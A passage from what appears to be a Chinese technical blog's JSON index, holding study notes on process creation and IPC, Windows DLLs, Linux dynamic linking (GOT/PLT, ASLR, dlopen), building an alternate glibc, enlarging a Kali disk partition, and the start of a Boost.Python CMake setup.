Failed\u0026#34;); return 1; } else if (pid == 0) { /* child process */ execlp(\u0026#34;/bin/ls\u0026#34;,\u0026#34;ls\u0026#34;,NULL); } else { /* parent process */ /* parent will wait for the child to complete */ wait(NULL); printf(\u0026#34;Child Complete\u0026#34;); } return 0; } 其中子进程使用execlp（exec的变种）来将一个二进制文件载入内存空间，然后执行这个二进制文件的代码。如果子进程没有调用exec函数，那么它执行的代码就一直是父进程的拷贝（但当然可以使用分支来区别父子进程的任务，只是从整体来看，不调用exec，代码段就是一样的）\n其中父进程调用wait函数阻塞自己，由wait自动分析是否当前进程的某个子进程已经退出，如果让它找到了这样一个子进程，wait就会收集这个子进程的信息，并把它彻底销毁后返回；如果没有找到这样一个子进程，wait就会一直阻塞在这里，直到有一个出现为止。\n如果子进程退出，那么它就会变成一个僵尸进程，它的入口仍然会存在表中（用于确定进程执行的状态），直到父进程调用wait找到它并释放，它才会消失。如果父进程在调用wait前就退出了，在Linux中，这个子进程就变成了孤儿进程，被根进程继承，然后根进程（systemd或者init）会隔一段时间调用wait释放名下的僵尸进程，由此这个孤儿进程就有机会被释放。\n而在Windows下，创建一个进程的同时必须指定它需要load的可执行文件（因此Windows API中创建进程的函数CreateProcess有不下十个参数）\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; int main(VOID) { STARTUPINFO si; PROCESS INFORMATION pi; /* allocate memory */ ZeroMemory(\u0026amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(\u0026amp;pi, sizeof(pi)); /* create child process */ if (!CreateProcess(NULL, /* use command line */ \u0026#34;C:∖∖WINDOWS∖∖system32∖∖mspaint.exe\u0026#34;, /* command */ NULL, /* don’t inherit process handle */ NULL, /* don’t inherit thread handle */ FALSE, /* disable handle inheritance */ 0, /* no creation flags */ NULL, /* use parent’s environment block */ NULL, /* use parent’s existing directory */ \u0026amp;si, \u0026amp;pi)) { fprintf(stderr, \u0026#34;Create Process Failed\u0026#34;); return -1; } /* parent will wait for the child to complete */ WaitForSingleObject(pi.hProcess, INFINITE); printf(\u0026#34;Child Complete\u0026#34;); /* close handles */ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); } 进程终止 当一个进程执行完了它的任务并执行exit函数，操作系统就会终止它并返回这个进程的状态码给使用wait函数等待子进程的父进程（因此如果没有调用wait，就没有人接收这个状态码，为了保证以后有机会获取状态码，子进程的入口就必须保留，这样子进程就成了僵尸进程），同时子进程的所有资源都会被释放。\n除了子进程自己结束自己，在直到子进程“身份”的情况下，其他进程（通常是父进程）也可以通过适当的系统调用结束掉这个进程（比如Windows下的任务管理器）\n有些操作系统不允许父进程退出时子进程还未退出，于是会在父进程退出时强行退出子进程，这个现象叫做级联终止（cascading termination）\n进程间通信 两个进程可以是合作的进程，也可以是互不相干的。当两个进程进行合作时，就需要有一种进程间通信/交流（InterProcess Communication，简称IPC）的方式。\n有两种常用的通信方式：\n共享内存（shared memory） 消息传递（message passing） 共享内存 我们可以把协作的进程看作生产者和消费者，生产者进程生成信息，消费者进程使用信息。\n生产者生成的信息可以放在共享内存中的缓冲区中，然后消费者从中获取一项使用。生产者和消费者必须同步，这样消费者才不会使用没有被生产出来的信息\n有以下两种缓冲区：\n有界缓冲区，假如缓冲区满，生产者就必须等待；假如缓冲区空，消费者必须等待 无界缓冲区，生产者可以一直创建新信息，而消费者可能需要等待 下面是一个有界缓冲区的代码示例：\nitem next produced; while (true) { /* produce an item in next produced */ while (((in + 1) % BUFFER SIZE) == out) ; /* do nothing */ buffer[in] = next produced; in = (in + 1) % BUFFER SIZE; } 比如，POSIX系统使用内存映射文件实现共享内存对象\n消息传递 可以使用操作系统提供的机制进行消息传递\n为了在进程间通信，就必须建立通信链路，而为了建立通信链路，使用消息传递系统的进程必须支持以下原语：\nsend(message); receive(message); 命名 为了向一个进程传递消息，我们必须知道这个进程是谁，也就是必须知道它的身份/名称\n对称性直接通信 send向指定进程发件，receive从指定进程收件\n这时通信链路显式且准确地在两个进程间建立了\n非对称性直接通信 send向指定进程发件，receive可以从任意进程收件（发件人名称变成了变量）\n以上两种直接通信的方式都丧失了模块化，某种程度上是硬编码的，要更改、维护非常困难。\n间接通信 简单来说就是建立一个中间人来派发信件，这个中间人可以是邮箱或者端口\nsend向邮箱发件，receive可以从邮箱收件\n这样两个进程之间可以有多条通信链路，一条链路也可以在多个进程间共享，这样就增加了模块化\n这种间接通信依赖于中间人，因此只有两个进程共享邮箱的时候，才能建立通信链路，因此共享链路的意思也就是共享邮箱\n问题来了，既然一个邮箱可以被多个进程共享，当多个进程同时向邮箱收件的时候应该怎么办呢？这取决于程序的设置或者操作系统的设置。\n邮箱可以是属于进程的，也可以是属于操作系统的。如果邮箱是属于进程的，那就要区分所有者和使用者，确定收发邮件的权利；如果邮箱是属于操作系统的（某种程度上，操作系统也是一个进程），那么操作系统就要提供机制进行收发权利的授权。\n比如，mach系统使用端口来进行消息传递，即便是系统调用也使用端口来传递消息（操作系统也可以看作一个进程）\n而Windows使用共享内存和消息传递相结合的方式：\n小消息通过端口传递 大消息创建共享内存中的区段对象传递 更大的不适合使用区段对象的消息，可以通过API直接访问对方的地址空间 同步 消息传递可以是阻塞/同步的或者非阻塞/异步的：\n阻塞发送：发送进程阻塞，直到消息被接收 非阻塞发送：发送进程一直可以发送 阻塞接收：接收进程阻塞，直到有消息被发送 非阻塞接收：接收进程一直可以接收（没有消息就收到空消息） 缓存（消息队列） 发送的消息总是会放在（临时）消息队列中，有以下几种队列：\n零容量，链路中不能有任何消息在等待，因此发送了就必须被接收，发送进程在发送后必须阻塞 有限容量，在队列满了后发送进程必须阻塞 无限容量，队列不会满，因此发送进程从不阻塞 显然，采取哪种缓存策略和采用哪种同步策略是密切相关的\n","date":"2023年04月07日","permalink":"https://peterliuzhi.top/principle/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"We all grow up. Hopefully, we get wiser. Age brings wisdom, and fatherhood changes one\u0026rsquo;s life completely. — Frank Abagnale 什么是进程 进程的概念 所有的CPU活动称为进程(process)。进程是程序执行的过程，是程序资源管理的最小单位","tags":["pwn","操作系统概念读书笔记"],"title":"【操作系统概念读书笔记】进程基础知识"},{"categories":["principle"],"contents":" Continuous effort - not strength or intelligence - is the key to unlocking our potential. — Winston Churchill\n本文是笔者阅读《俞甲子, 石凡, 潘爱民 - 程序员的自我修养_ 链接、装载与库-电子工业出版社 (2009)》的学习笔记~\n如有错漏，欢迎指正~~\n基本介绍 Windows下的DLL相当于Linux下的共享对象（so），它实际上和EXE是一个概念，都是PE格式文件，只是PE文件头中有一个符号位标记它是DLL还是EXE\nWindows广泛使用了DLL，甚至内核中都大量使用了DLL\n进程地址空间和内存管理 每个进程有自己单独的地址空间，而每个DLL在每个进程中都有一个副本\nDLL中没有地址无关性（只是在某些情况下能被多个进程共享），它使用基址重置来加载DLL\n基地址和相对地址RVA 起始地址就是基地址，偏移就是RVA\n数据段 每个数据段都有一个单独的数据段，但是Windows允许数据段在多个进程内共享，只是不太安全。\n常见的做法是一个私有数据段，一个公有数据段，需要共享的再放在公有数据段中。\n导出符号 ELF默认导出所有函数，但是DLL默认不导出。因此如需导出，需要对需要导出的符号进行特殊定义。\n使用__declspec(dllexport)修饰一个符号来说明它是要导出的 使用.def文件定义哪些符号需要导出 导出表 导出表是一个IMAGE_EXPORT_DIRECTORY类型的结构体：\n最后三项分别指向三个数组：\n导出地址表 EAT，存放各个导出函数的RVA 符号名表，保存导出函数的名称 名字序号对应表，用于表示函数名和函数序号的对应关系 什么是函数序号 这是个历史遗留问题。因为以前的内存很小，保存不了那么长的函数名，因此用函数序号代替。\n为了向后兼容，现在仍然保存序号机制。一个DLL可以没有函数名，但是不能没有序号，甚至函数名是用来查找序号的。\n但是只有序号的可维护性极低，因为一旦增减了函数，那么序号就会发生变化，已有的应用程序就会出现不兼容。因此在现在的条件下，为了那么一点内存放弃函数名只保留序号得不偿失。\nEXP文件 （不是pwn里的exp~）\n链接器会遍历两次DLL，第一次遍历会收集所有的导出符号信息并建立导出表，然后将这个表放在EXP文件的.edata段里面（EXP也是一个标准PE/COFF目标文件）\n第二遍就把EXP文件和其他目标文件一起链接，获取.edata段的信息。但在最终的DLL中，一般不会保留.edata而是会将其合并到.rdata中\n导出重定向 意思就是把其他DLL的符号重定向到本DLL的符号表中，但是导出表中保存的它的RVA指向的不是函数而是一个字符串，用来描述这个符号在哪个DLL，叫什么。\n比如我们可以使用.def文件定义：\n因此它在导出表中的RVA指向的字符串就是NTDLL.RtAllocHeap\n导入符号 对导出的符号，如果我们想使用，我们需要显式地定义这个符号为导入符号：\n常见的做法是把它放在一个头文件里面，连同库一起提供给使用者\n在DLL制作者生成DLL时，如果使用静态加载，那么同时会生成一个用于描述DLL的导出符号的.lib静态库，它包含了可执行程序所需的导入符号和一部分桩代码（称为胶水代码）。\n比如我们要生成一个Math.dll：\n显式运行时链接（动态加载） 这时候就不一定需要.lib文件，也不一定需要__declspec(dllexport)来定义符号。但是，这样就无法使用GetProcAddress获取到导出符号，只能加载和卸载DLL（但是可以通过DLL注入等其他技巧获取到符号地址），因此，默认情况下，动态加载仍然需要使用__declspec(dllexport)或者.def文件。\n使用WINAPI中的LoadLibrary、GetProcAddress、FreeLibrary来动态加载一个DLL，他们的功能类似于Linux glibc中的dlopen、dlsym、dlclose\n导入表 导入表是一个IMAGE_IMPORT_DECRIPTOR类型的结构体：\n最后一项FirstThunk指向导入地址数组，即IAT（对应EAT），它的元素在不同情况下有不同含义：\n在重定位和符号解析之前，它表示相对应的导入符号的符号名或者序号（如果这个元素的最高位为1，那么剩下的位表示序号；反之指向一个IMAGE_IMPORT_BY_NAME结构体用以代表符号名） 当Windows完成链接后，它表示导入符号的真实地址 导入表还有一个成员，也就是它的第一项OriginalFirstThunk，指向导入名称表，即INT，它和IAT一模一样，但是它是用于DLL绑定的\n延迟载入 类似于ELF中的延迟绑定，但是它是通过链接器添加的桩代码来实现的。\n当某个外部符号被第一次调用时，桩代码就会调用GetProcAddress来查找地址，因此可以把它看作是静态加载和动态加载的杂交体。\n导入函数的调用 模块内部的函数直接call它的地址，模块外的call [该函数在IAT中的项]。这种方法类似于GOT表。\nDLL没有地址无关性，它使用基址重置和装载时重定位 DLL没有全局符号介入的问题（可以通过DLL名.函数名来定位一个函数）\n为了确定函数是模块内的还是模块外的，就要用到__declspec(dllimport)\n但是在__declspec关键字诞生以前，微软还有另一种处理方法，就是直接call xxx：\n对外部函数来说，会call桩代码，然后桩代码再转到IAT中的相应项。编译器在产生导入表时，会对同一个函数x生成两个符号定义：\nx指向这个符号的桩代码 __imp__x指向这个符号在IAT中的项 现在的MSVC同时支持两种方式，但是建议还是使用__declspec(dllimport)，这样可以少一句指令的执行。\nDLL优化 基址重置（重定基地址） Windows的DLL没有地址无关性，它会在每次装载的时候重定位。\n那如果准备加载的DLL的基址已经被占用了呢？答案是动态地更改加载的DLL基址，这就是基址重置。\n比如DLL基地址的默认值为0x10000000，假设当b.dll装载的时候，发现0x10000000已经有一个a.dll占用了，那它就会把基址设为其他值。\n确定了基地址就会对dll进行重定位，包括数据段中的绝对地址引用。\n显而易见的，这样启动速度会很慢，但是运行速度比PIC快一点，因为不用通过GOT间接查找\n指定dll基址 我们可以指定dll在装载的时候的初始基地址\neditbin /REBASE:BASE:0x10020000 xxx.dll 导入函数绑定 由于dll不是PIC的，每次运行都是一样的，那么我们就可以提前进行符号解析。\n我们可以提前进行符号解析，将导入函数绑定：\neditbin /BIND xxx.exe 需要注意的是，如果依赖的dll更新（通过时间戳和校验和判断），那么仍然会重新进行符号解析\n也就是说，导入函数绑定至少不会让程序更慢。\n","date":"2023年03月15日","permalink":"https://peterliuzhi.top/principle/windows%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"Continuous effort - not strength or intelligence - is the key to unlocking our potential. — Winston Churchill 本文是笔者阅读《俞甲子, 石凡, 潘爱民 - 程序员的自我修养_ 链接、装载与库-电子工业出版社 (2009)》的学习笔记~ 如","tags":["pwn","底层原理","动态链接","基础知识","Windows"],"title":"Windows动态链接_基础知识"},{"categories":["principle"],"contents":" Honesty is the first chapter in the book of wisdom. — Thomas Jefferson\n本文是笔者阅读《俞甲子, 石凡, 潘爱民 - 程序员的自我修养_ 链接、装载与库-电子工业出版社 (2009)》的学习笔记~\n如有错漏，欢迎指正~~\n动态链接的原因 节省空间。有些不同程序都会用到的共享的库不需要装载两次进内存 方便更新。发布者更新库后，只需要替换原本的库文件，使用者不需要重新编译程序 制作插件。程序可以有选择地动态链接某些共享库，决定使用哪些功能，不使用哪些功能。 共享对象在动态链接的时候装载在哪里 固定装载地址。手工规划可执行文件在虚拟空间的地址和共享对象在虚拟空间的地址，这种做法叫做静态共享库，现在很少用。 装载时重定位。相对于链接时的链接时重定位，这种重定位在装载时才进行重定位（Windows下又叫基址重置），产生共享对象时在gcc后面加上-shared启用。但是这种方法不能让共享对象在进程内共享，失去了节省空间的一大优势。 地址无关代码。让共享对象的代码与具体的虚拟地址无关，这样共享对象就能在进程间共享，产生共享对象时在gcc后面加上-shared -fPIC启用（默认情况下gcc为可执行程序的代码段生成地址无关代码（PIC代码））。 装载时重定位是共享对象主动改变自己的地址，而地址无关代码是用到共享对象的可执行文件主动去找共享对象。\n地址无关代码 几种不同的调用 模块内部调用或跳转 直接进行相对地址调用（或基于寄存器相对调用）。这里可能会出现全局符号介入的问题。\n模块内部数据访问 使用函数__i686.get_pc_thunk.cx函数将下一条指令的地址赋给ecx寄存器，然后对这条指令的地址加上一定的偏移就可以得到数据地址。\n这么做的原因是数据访问必须需要绝对地址，然而地址无关代码难以确定绝对地址，因此通过代码段和数据段之间的偏移来计算得到绝对地址\n模块间数据访问 使用GOT（Global Offset Table，全局偏移表）表来间接引用。具体来说，链接器会在装载的时候将变量的地址填充入GOT表中（它存放在数据段，可以被修改）。我们在编译的时候确定指令与GOT之间的偏移，这样就可以转化为模块内数据访问了。\n特别的，数据的GOT表放在.got段\n如何确定数据是在可执行文件的其他目标文件还是在共享对象中？ 因为只有链接的时候编译器才会知道这件事的答案，而编译的时候就要确定这个数据是外部的还是内部的（因为需要建立GOT表等），所以ELF默认将这种不知道是外部的还是内部的全部看作外部的，这样最保险。\n在一个模块中更改全局变量会不会影响源共享对象的全局变量 不会。因为共享对象的数据段部分在每个进程中都有独立的副本。\n但同时也有方法实现多进程共享数据段，这种方法叫做\u0026quot;共享数据段\u0026quot;，在Windows的DLL中就可以使用这种方法，但是这种方法极为危险，必须小心形式。\n同时，一个进程可能有多个线程，每个线程能否有自己的数据段副本呢？答案是可以的，这种副本又叫做线程私有存储\n为什么对数据的处理和对函数的处理不一样？ 因为数据需要在不改变函数流程的情况下获取值（不然性能代价就太大了），而且也有更改值的需求\n数据段的地址无关性 由于数据段可能有指针，所以会存在绝对地址引用，比如：\nstatic int a; static int *p = a 这里p就是一个绝对地址引用。\n但是变量a的地址会随着共享对象的装载地址改变，那应该怎么办呢？\n由于每一个进程都有一个数据段的副本，因此对数据段来说，可以尽情使用装载时重定位，而不用担心地址无关性的\u0026quot;初衷\u0026quot;——节省空间。\n模块间调用、跳转 与模块间数据访问一样，将目标函数的地址放在GOT表中间接调用\n特别的，函数的GOT表放在.got.plt段\n延迟绑定（PLT） 如果我们在链接器进行动态链接的时候将动态库的每一个函数都放进GOT表，必然会减慢程序的启动速度。\n比如，在程序运行的过程中，由于if语句等的分支控制，有一些函数可能不会用到，但是如果我们提前就将其装进了GOT表中，就平白造成了性能损耗。因此我们可以想一种办法让程序在调用到这个函数的时候再将函数调用地址放进GOT表。这对变量也是一样的。\n除此之外，将加载模块外函数的时间分散到程序执行的过程中，给人的错觉也是\u0026quot;程序更快了\u0026quot;。\nELF借助PLT（Procedure Linkage Table，过程链接表）实现延迟链接。每个外部函数在PLT中都有一个项，而调用函数并不直接通过GOT跳转，而是通过PLT项来进行跳转。\n比如我们有一个叫bar的外部函数，因此bar@plt的实现类似于：\n如果之前调用过bar函数，那么第一句的jmp会直接跳转到GOT表中保存的绝对地址处；如果没有调用过，那么bar@GOT处放的就是下一条指令push n的地址，也就是说，程序会跳转回来。\n然后接下来的push n会将n入栈，这个n是bar这个符号在重定位表.rel.plt中的下标，这样我们就知道需要绑定的是哪个函数；然后又将模块的ID入栈，这样我们就知道使用的是哪个共享对象；最后调用_dl_runtime_resolve函数进行绑定，前面入栈的都是这个函数的参数。\n而PLT的真正实现会稍微复杂一点。.got.plt的前三项有特殊的意义：\n第一项是.dynamic的地址 第二项是link_map对象的地址 第三项是_dl_runtime_resolve()的地址 而PLT的实现依赖他们。比如我们来看x64下的实现：\n然后我们看看.got.plt现在的值：\n可以看到，第二项和第三项在运行之前都是0，说明他们是在运行时才能确定的\n而link_map结构体的定义如下（定义在/usr/include/link.h），由此可见，这就是ELF表示\u0026quot;模块ID\u0026quot;的一种方式：\n动态链接相关结构 因为靠可执行文件一个人肯定是完成不了动态链接这个艰巨的任务的，所以我们需要动态链接器来帮助我们执行一些动态链接相关的操作，再把控制权传给可执行程序。而动态链接器想要正常的工作，就势必需要一些信息，而这些信息需要保存在可执行文件中。\n.interp 段 就是interpreter段，解释器段，定义了动态链接器的路径：\n就是一个字符串，这个ld-linux-x86-64.so.2是一个软链接，指向当前使用的动态链接器（这样当更新库的时候这个字符串不用更改就可以指向最新的动态链接器）\n动态链接器在Linux下是glibc的一部分，属于系统库级别，往往版本号需要与glibc版本号一致\n.dynamic段 保存了动态链接器所需要的基本信息，如：\n依赖于哪些共享对象 动态链接符号表的位置 动态链接重定位表的位置 共享对象初始化代码的地址 …… 通过这个段我们还能得到程序对共享库的依赖，可以利用ldd命令来查看：\n.dynsym段 动态符号表 类似于.symtab段，为了表示动态链接模块之间的符号导入导出关系，ELF使用动态符号表的段来保存这些信息（这个段往往叫做.dynsym），同时类似于.strtab保存符号名称，.dynstr用于保存动态符号字符串表\n很多时候动态链接的模块同时拥有.dynsym和.symtab两个段，.symtab保存了所有符号，而.dynsym只保存了动态的\n.rel段 动态链接重定位表 一个共享对象需要重定向的原因是导入符号的存在。因为共享对象可能依赖于其他对象，因此从这些对象中导入的符号不管是静态链接的还是动态链接的最终都需要修正。\n就算一个共享对象是PIC的，它的代码段不需要重定位，它的数据段也需要重定位，因为数据段可能存在绝对地址引用，更别说GOT表存在于数据段中了\n因此，类似于静态链接中的.rel.data和.rel.text段，动态链接中也分别有.rel.dyn（数据段）和.rel.plt（代码段）：\n为什么每个程序的libc地址都不一样？ 因为操作系统将同一物理地址的libc（PTC的）映射到不同程序的虚拟空间上，由于每一个程序的虚拟空间都可能不同，所以libc的基址也可能不同\n但是这并不意味着libc在这个进程上产生了一个副本，这只是操作系统的一种虚构的映射关系\n为什么每一次运行程序，libc的基址都不一样？ 因为现代操作系统为了提高系统的安全性，采用了ASLR(Address Space Layout Randomization)技术。ASLR技术会在每次程序加载到内存时，随机地选择一个基地址来加载程序的代码和数据段，这样可以使得攻击者很难确定程序的准确地址，从而减少了攻击的可能性。\n注意，ASLR是操作系统级别的保护，而PIE依赖于编译器的优化\nASLR Executable PLT Heap Stack Shared libraries 0 × × × × × 1 × × × √ √ 2 × × √ √ √ 2+PIE √ √ √ √ √ 动态链接的步骤和实现 步骤基本上分为三步：\n启动动态链接器本身 装载所需要的共享对象 重定位和初始化 第一步——启动动态链接器本身 动态链接器使用一段精巧的代码处理自身的重定位工作，这段启动代码称为自举代码。\n动态链接器的入口就是自举代码的入口，操作系统将控制权交给动态链接器后，自举代码就开始运行，首先它找到自己的GOT表，得到.dynamic的地址，然后就可以获得动态链接器本身的重定位表和符号表，从而进行自身的重定位\n事实上动态链接器的自举代码会用到模块内部的函数以及全局变量等\n我们查看源代码会发现，自举代码确实调用了其他函数，也确实使用了全局变量\n我们可以使用objdump看一下：\n第二步——装载共享对象 完成基本自举后，动态链接器将可执行文件和动态链接器本身的符号表合并到一个符号表中，称之为全局符号表。\n然后动态链接器可以从可执行文件中.dynamic的DT_NEEDED类型的入口中得知可执行文件依赖的共享对象，然后（广度/深度）搜索共享对象并装载\n全局符号介入 当一个符号需要被加入全局符号表中时，如果符号名已经存在，则后加入的符号被忽略。\n因此我们可以通过LD_PRELOAD来覆盖本来会执行的函数\n导致PIC共享对象出现的问题 如果PIC对象内部的符号在装载这个共享对象之前已经出现过了，那么它就会被忽略，那么这个对内部符号的调用就会出现问题。因此编译器只能把这些符号当作模块外部函数。\n这样性能就会出现问题，所以我们可以人工地定义这个函数为static，这样这个内部函数就不会被覆盖，就会执行模块内部调用\n第三步——重定位和初始化 重定位 加载共享对象后需要对数据段进行重定位（比如PLT/GOT表，绝对地址引用等）\n初始化 如果共享对象中有.init段，动态链接器就会执行.init段中的代码进行初始化。\n同样的，如果有.fini段，在退出进程时会执行.fini中的代码进行清理。\n在做完这些工作之后，动态链接器就把控制权交给程序来执行了\nLinux下动态链接器的实现 共享库和可执行文件没有什么区别，只要有一个程序入口，操作系统把控制权转交给这个入口，代码就能执行。Linux下和Windows下的动态链接器既是共享库也是可执行文件，可以通过一定的方式执行。 Linux下的动态链接器本身是glibc的一部分，_start函数是它的入口，然后_start调用_dl_start进行自举 动态链接器获取操作系统转交的控制权后，执行一定的操作，再将控制权转交给可执行程序。 动态链接器本身是静态链接的，因为如果它是动态链接的，又谁来帮他处理这种依赖关系呢？ 动态链接器一般是PIC的，但是不一定 动态链接器在装载入内存时操作系统才为它选择合适的装载地址 显示运行时链接（动态加载） 在Linux上和Windows上我们都可以通过一定的API实现显示运行时链接。\n简而言之，就是在需要这个共享库的时候加载共享库，然后获取它的符号，不想要用的时候就将其卸载。\n这些事情都要通过动态链接器实现，这就是全局符号表中要包含动态链接器的符号的原因。\n这里介绍一下Linux下的API。\ndlopen() void * dlopen (const char *file, int mode)\n加载一个库，这个库的搜索顺序如下：\n搜索LD_LIBRARY_PATH中的路径 搜索/etc/ld.so.cache中的路径 搜索/lib/、usr/lib(这一步a.out反过来) 有意思的是，如果我们的file参数为0，函数将返回全局符号表的句柄，因此我们可以查找全局符号表中的任何一个符号并执行\nflag参数指动态加载的方式，可以使用RTLD_LAZY表示延迟绑定，也可以使用RTLD_NOW表示立即导入，他们都可以通过或操作或上一个RTLD_GLOBAL来表示是否和全局符号表合并(建议使用立即导入以立即发现动态加载是否有问题)\n如果有.init还会执行.init\ndlsym() void * dlsym (void *handle, const char *name)\nhandle是dlopen返回的句柄，name是符号的名字\n如果是函数则返回函数的地址 如果是变量返回变量的地址 如果是常量返回常量的值 没找到返回NULL dlsym()会以打开的共享对象为节点，广度优先搜索它依赖的所有对象，直到找到符号为止，这称为依赖序列。\n如果常量的值刚好是NULL或者0呢？ 使用dlerror()函数捕获错误\ndlerror() char * dlerror (void)\n成功返回NULL，不成功返回错误信息\ndlclose() int dlclose (void *handle)\nhandle是dlopen返回的句柄。\n当每次调用dlopen时，对这个模块的计数器加一；调用dlclose时减一。当减到0时就卸载这个模块。\n注意，dlopen是先载入符号再调用.init，但是dlclose会先执行.fini中的代码再去除符号，有点类似于栈。\n如有错漏，欢迎指正~~\n","date":"2023年03月14日","permalink":"https://peterliuzhi.top/principle/linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"Honesty is the first chapter in the book of wisdom. — Thomas Jefferson 本文是笔者阅读《俞甲子, 石凡, 潘爱民 - 程序员的自我修养_ 链接、装载与库-电子工业出版社 (2009)》的学习笔记~ 如有错漏，欢","tags":["pwn","底层原理","动态链接","基础知识","Linux"],"title":"Linux动态链接_基础知识"},{"categories":["tricks"],"contents":" There are things so deep and complex that only intuition can reach it in our stage of development as human beings. — John Astin\n注：本文介绍的是一种暂时运行的方法，不会更改系统默认的库版本，如果需要升级系统库版本，可以参阅Ubuntu18.04升级安装GLIBC2.29 - 知乎\n编译安装glibc 我这里以glibc2.29为例，我们可以先下载glibc2.29的源码：\nwget http://ftp.gnu.org/gnu/glibc/glibc-2.29.tar.gz 其他版本的源码的下载链接可以在Index of /gnu/glibc找到\n然后解压，建立build文件夹并进去：\ntar -zxf glibc-2.29.tar.gz cd glibc-2.29 mkdir build cd build/ 然后我们在配置之前，先下载一些需要用到的工具：\nsudo apt-get install make gawk bison -y 然后进行配置，这里我们选择一个目录设置为library生成的路径，我这里设置为了$HOME/uselib/：\n../configure --prefix=$HOME/uselib/ --disable-sanity-checks # 一般如果系统没有提示GNU的问题的话，直接运行这个就可以 ../configure --prefix=/usr/local，如果有提示GNU问题，会弹出提示是否在命令中加入--disable-sanity-checks参数。当然上面的命令已经包含了--disable-sanity-checks，所以，括号中的内容就当废话看好了，只是贴出来方便遇到问题的人 然后就开始构建了：\nmake -j18 \u0026amp;\u0026amp; make install 构建完的库在$HOME/uselib/lib下\n如何运行程序？ 假设我们的程序名是example，那么我们可以这样运行程序：\n$HOME/uselib/lib/ld-2.29.so --library-path $HOME/uselib/lib/:/usr/lib/x86_64-linux-gnu/:/lib/x86_64-linux-gnu/ ./example 其中\u0026ndash;library-path后面跟着的是\u0026lt;你下载的库的路径\u0026gt;:\u0026lt;程序用到的所有库的路径\u0026gt;\n我们可以使用ldd命令来查看程序用到的库：\nldd example 这个命令的基本原理就是，链接器既是一个共享对象，也是一个可执行程序，系统将程序入口设置在链接器的入口，然后链接器加载需要的动态库，再将入口设置在程序的入口。因此我们可以通过链接器指定需要的库，然后运行程序。\n","date":"2023年03月12日","permalink":"https://peterliuzhi.top/tricks/linux%E4%B8%8B%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E6%9B%B4%E6%94%B9%E7%B3%BB%E7%BB%9F%E7%9A%84glibc%E5%BA%93%E7%9A%84%E5%90%8C%E6%97%B6%E8%BF%90%E8%A1%8C%E9%9C%80%E8%A6%81%E4%B8%8E%E7%B3%BB%E7%BB%9Fglibc%E5%BA%93%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84%E7%A8%8B%E5%BA%8F/","section":"tricks","summary":"There are things so deep and complex that only intuition can reach it in our stage of development as human beings. — John Astin 注：本文介绍的是一种暂时运行的方法，不会更改系统默认的库版本，如果需要升级系统库版本，可以参阅Ubun","tags":["pwn"],"title":"Linux下如何在不更改系统的glibc库的同时运行需要与系统glibc库不同版本的程序？"},{"categories":["posts"],"contents":"本文转载自关于kali sda1爆满扩容 | 是我 の blog，敬请关注并支持原作者是我 の blog！\nDo not turn back when you are just at the goal. — Publilius Syrus\n前言（起因 一天感觉 kali 怪怪的 就查看了一下内存情况\ndf -h 果不其然\u0026hellip; 于是到处搜集资料一步一步进行 sda1 的扩容\n一、先进行磁盘的扩容 这部分参考\n二、唤起 gparted Gparted 我 kali 的 gparted 是自带的还是以前下载的（？\n没有就直接安装一下~\n先用命令进入root模式 省的一直sudo\nsudo -i 唤起工具 gparted\ngparted （我这里存在未分配是因为我之前添加了空间但是没扩进去\u0026hellip;）\n三、删除 extended 和 swap 分区以便进行扩容 先停用 swap 分区\n然后删除 swap 分区\n接着删除 extended 分区\n四、对 sda1 进行扩容 记得预留出空间给 swap 分区\n还原 extended 和 swap 分区\n👇👇👇\n👇👇👇\n👇👇👇\n然后退出保存\n再次 df -h 查看扩容情况\n成功？ 很多人到这一步就以为成功了\n扩容是扩了 但是如果你重启会发现 启动的十分甚至有九分之慢\n五、修复 SWAP 分区 以下参考\n我们首先要获取新 swap 分区的 uuid\nblkid 这个 uuid 复制下来 后面要用\nvim /etc/fstab 关于 vim 命令的使用~\n将这部分的 uuid 改成新的 uuid\n接着\nvim /etc/initramfs-tools/conf.d/resume 将这部分的 uuid 也改成新的 uuid\n最后用一下这个命令重建一下？（我的没用）\nsudo update-initramfs -u 然后重启一下 kali 就完成扩容啦~\n","date":"2023年03月10日","permalink":"https://peterliuzhi.top/posts/%E5%85%B3%E4%BA%8Ekali-sda1%E7%88%86%E6%BB%A1%E6%89%A9%E5%AE%B9/","section":"posts","summary":"本文转载自关于kali sda1爆满扩容 | 是我 の blog，敬请关注并支持原作者是我 の blog！ Do not turn back when you are just at the goal. — Publilius Syrus 前言（起因 一天感觉 kali 怪怪的 就查","tags":["杂谈","kali"],"title":"关于kali sda1爆满扩容"},{"categories":["posts"],"contents":" Wherever a man may happen to turn, whatever a man may undertake, he will always end up by returning to the path which nature has marked out for him. — Johann Wolfgang von Goethe\n注意，请保证你的机器上下载了boost库，如果没有，Ubuntu系统下使用：\napt-get install libboost-all-dev Windows请前往Boost Downloads下载\n01_HelloWorld——简单示例 参考自Boost(2)：boost.python库介绍及简单示例_boost python_翔底的博客-CSDN博客\n假设工作目录如下：\n. ├── 01_HelloWorld │ ├── CMakeLists.txt │ ├── hello.py │ └── HelloWorld.cpp └── CMakeLists.txt 在主目录的CMakeLists.txt：\n# 设置项目名称为 Boost_Test project(Boost_Test) # 指定 CMake 最低版本号 cmake_minimum_required(VERSION 2.8.3) set(CMAKE_VERBOSE_MAKEFILE ON) # 查找 Python 解释器和 Python 库 find_package(PythonInterp REQUIRED) find_package(PythonLibs ${PYTHON_VERSION_MAJOR}.${PYTHON_VERSION_MINOR} EXACT REQUIRED) # 查找 Boost 库的 Python 组件 # 根据不同的 Boost 版本，Python 组件的名称可能是 python、python2、python27、python3、python36、python37 等 list( APPEND _components 